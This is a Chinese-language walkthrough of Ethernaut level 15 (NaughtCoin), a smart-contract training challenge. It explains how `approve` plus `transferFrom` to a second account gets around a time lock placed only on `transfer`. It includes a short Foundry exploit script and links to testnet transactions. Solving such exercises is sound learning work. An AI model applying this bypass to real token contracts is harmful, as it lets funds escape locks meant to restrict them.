
# Level 15

[The Ethernaut level 15](https://ethernaut.openzeppelin.com/level/15)

这一关的要求是绕过时间限制提取所有代币

仔细阅读合约发现，该合约实现了 ERC20 标准，并尝试防止初始代币持有者在给定的时间锁（`timeLock`）之前转移代币。合约在 `transfer` 函数添加了 `lockTokens` 修饰器，通过 `msg.sender == player` 限制了初始代币持有者提取时间。
但是，ERC20 合约不只一个转账函数。通过 `arrprove` 和 `transferFrom`，可以授权他人动用自己的币。
因此，只要初始代币持有者委托给第三者进行转账即可提取所有代币。

攻击脚本：
```
...
address player = vm.addr(privateKey);
address spender = vm.addr(privateKeySpender);

address levelAddr = 0x69f52ffB405AB5DaaEbDb1111C4F5ec64DaF37C8;
NaughtCoin level = NaughtCoin(levelAddr);

// 初始化 player
vm.startBroadcast(privateKey);
level.approve(spender, level.balanceOf(player));
vm.stopBroadcast();

// 初始化 spender
vm.startBroadcast(privateKeySpender);
level.transferFrom(player, spender, level.balanceOf(player));
vm.stopBroadcast();
```

完整代码见：[这里](../../../../ethernaut/script/Level15.s.sol)

链上记录：
- [level(`NaughtCoin`)](https://sepolia.etherscan.io/address/0x69f52ffB405AB5DaaEbDb1111C4F5ec64DaF37C8)
- [attack 交易](https://sepolia.etherscan.io/tx/0xe922107016ca833a231a94b896fcc14a80722afe1baf6501de83c27052f768f6)
